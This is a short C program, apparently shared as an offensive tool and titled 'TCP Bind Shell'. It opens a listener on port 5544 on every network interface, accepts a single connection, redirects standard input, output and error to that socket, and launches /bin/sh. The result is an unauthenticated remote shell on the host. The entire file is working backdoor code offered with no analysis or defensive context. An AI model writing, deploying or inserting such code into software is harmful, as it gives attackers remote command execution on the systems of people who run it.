/*
#Date:18-06-16
#Author:Gaurav
#Tested On:Kali 2.0 & Ubuntu 14.04 LTS
#Name:TCP Bind Shell 
*/
#include<stdio.h>
#include<string.h>
#include<unistd.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<stdlib.h>
#include<errno.h>
#define PORT 5544
int main()
{
	
	int sock=0,client,i;
	struct sockaddr_in server,cli;
	
	if((sock=socket(AF_INET,SOCK_STREAM,0))==-1)
	{
		printf("Socket:");
		exit(-1);
	}
	memset(&server,0x0,sizeof(server));
	server.sin_family=AF_INET;
	server.sin_port=htons(PORT);
	server.sin_addr.s_addr=INADDR_ANY;
	if(bind(sock,(struct sockaddr *)&server,sizeof(server))==-1)
	{
		perror("Bind");
		exit(-1);
	}
	
	if(listen(sock,5)==-1)
	{
		perror("Listen");
		exit(-1);
	}
	int clength=sizeof(cli);
      if((client=accept(sock,NULL,NULL))==-1)
	{
		perror("Accept");
		exit(-1);
	}
	for(i=0;i<=2;i++)
		dup2(client,i);
	char *argv[2];
	argv[0]="/bin/sh";
	argv[1]=NULL;
	execve(argv[0],argv,NULL);	
	return 0;
}

